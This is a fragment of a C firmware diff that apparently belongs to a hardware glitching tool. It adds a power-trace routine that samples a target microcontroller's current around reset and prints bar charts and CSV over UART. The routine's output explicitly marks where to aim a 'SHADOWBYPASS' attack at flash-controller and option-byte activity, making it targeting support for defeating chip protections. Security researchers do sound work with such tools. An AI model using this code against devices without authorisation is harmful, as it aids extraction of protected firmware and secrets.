+        uint32_t v = n ? (uint32_t)(s / n / reps) : 0;
+        binv[nb++] = (uint16_t)v;
+        if (v < rmin) rmin = v; if (v > rmax) rmax = v;
+    }
+    uint32_t rspan = (rmax > rmin) ? (rmax - rmin) : 1;
+    // The high-side shunt rails near ADC full-scale on the plateau; the early
+    // rail-charging ramp drags rmin down and squashes the plateau/dip detail into
+    // a wall of full-width bars. Auto-zoom the BAR scale to the settled region
+    // (after the ramp first reaches 90% of the full range) so surges/sags show.
+    uint32_t chg_thr = rmin + (rspan * 90u) / 100u;
+    uint32_t charged = 0;
+    for (uint32_t b = 0; b < nb; b++) { if (binv[b] >= chg_thr) { charged = b; break; } }
+    uint32_t smin = 0xFFFFFFFF, smax = 0;
+    for (uint32_t b = charged; b < nb; b++) { if (binv[b] < smin) smin = binv[b]; if (binv[b] > smax) smax = binv[b]; }
+    if (smin == 0xFFFFFFFF) { smin = rmin; smax = rmax; }  // no settled region found
+    uint32_t sspan = (smax > smin) ? (smax - smin) : 1;
+    uart_cli_printf("SHADOWTRACE: %.2fus/sample, window ~%.2fms; shunt raw %lu..%lu (delta %lu LSB). SHADOWCHAR window = 40us..2513us.\r\n",
+                    us_per, samples * us_per / 1000.0f,
+                    (unsigned long)rmin, (unsigned long)rmax, (unsigned long)rspan);
+    uart_cli_printf("SHADOWTRACE: bars auto-zoomed to settled band %lu..%lu LSB (ramp ends ~%.0fus); '^'=clipped above band.\r\n",
+                    (unsigned long)smin, (unsigned long)smax, charged * per * us_per);
+    if (nrst_us >= 0.0f)
+        uart_cli_printf("SHADOWTRACE: nRST releases at +%.0fus after power-on (%lu/%lu reps); 'n=' column = time vs nRST (JG frame).\r\n",
+                        nrst_us, (unsigned long)nrst_idx_valid, (unsigned long)reps);
+    else
+        uart_cli_send("SHADOWTRACE: nRST release NOT seen in capture window — increase samples to bring it in-frame.\r\n");
+    for (uint32_t b = 0; b < nb; b++) {
+        uint32_t v = binv[b];
+        float t_us = b * per * us_per;
+        int bars;
+        if (v <= smin) bars = 0;
+        else if (v >= smax) bars = 40;
+        else bars = (int)((v - smin) * 40u / sspan);
+        char over = (v > smax) ? '^' : ' ';   // above the zoomed band (ramp peak)
+        char bar[41];
+        for (int k = 0; k < 40; k++) bar[k] = (k < bars) ? '#' : ' ';
+        bar[40] = '\0';
+        const char *mark = (t_us >= 40.0f && t_us <= 2513.0f) ? " <-win" : "";
+        // nRST-relative time (JG frame); flag the bin holding the nRST edge.
+        char nrel[24] = "";
+        if (nrst_us >= 0.0f) {
+            bool is_nrst = (t_us <= nrst_us && t_us + per * us_per > nrst_us);
+            snprintf(nrel, sizeof(nrel), " n=%+6.0f%s", t_us - nrst_us, is_nrst ? " <nRST" : "");
+        }
+        uart_cli_printf("  t=+%6.0fus raw=%4lu |%s|%c%s%s\r\n", t_us, (unsigned long)v, bar, over, mark, nrel);
+    }
+    // Raw CSV of EVERY sample (full time resolution) for unclipped external
+    // plotting: t_us:raw pairs, reps-averaged, no binning.
+    uart_cli_printf("SHADOWTRACE_NRST_US:%.1f\r\n", nrst_us);
+    uart_cli_send("SHADOWTRACE_CSV:");
+    for (uint32_t i = 0; i < samples; i++)
+        uart_cli_printf("%.1f:%lu%s", i * us_per, (unsigned long)(acc[i] / reps), (i + 1 < samples) ? "," : "");
+    uart_cli_send("\r\n");
+    // Release nRST back to input so we don't leave the target held in reset.
+    if (hold_nrst) { gpio_set_dir(reset_pin, GPIO_IN); gpio_pull_up(reset_pin); }
+    uart_cli_send("SHADOWTRACE: done. A current bump inside the window = flash-controller/option-byte activity; aim SHADOWBYPASS there.\r\n");
+}
+
 void target_power_shadowchar(uint32_t iterations) {
     if (iterations == 0) iterations = 10;
 
